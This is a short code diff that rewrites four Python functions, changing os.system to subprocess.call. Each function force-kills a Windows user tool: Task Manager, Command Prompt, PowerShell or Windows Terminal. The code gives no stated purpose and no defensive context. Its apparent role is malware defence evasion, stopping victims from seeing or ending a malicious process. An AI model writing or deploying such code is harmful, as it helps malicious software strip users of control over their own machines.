@@ -1,13 +1,13 @@
-import os
+import subprocess
 
 def killTaskManager():
-    os.system("taskkill /F /IM Taskmgr.exe")
+    subprocess.call("taskkill /F /IM Taskmgr.exe", shell = True)
 
 def killCommandPrompt():
-    os.system("taskkill /F /IM cmd.exe")
+    subprocess.call("taskkill /F /IM cmd.exe", shell=True)
 
 def killPowerShell():
-    os.system("taskkill /F /IM powershell.exe")
+    subprocess.call("taskkill /F /IM powershell.exe", shell=True)
 
 def killWindowsTerminal():
-    os.system("taskkill /F /IM WindowsTerminal.exe")
+    subprocess.call("taskkill /F /IM WindowsTerminal.exe", shell=True)
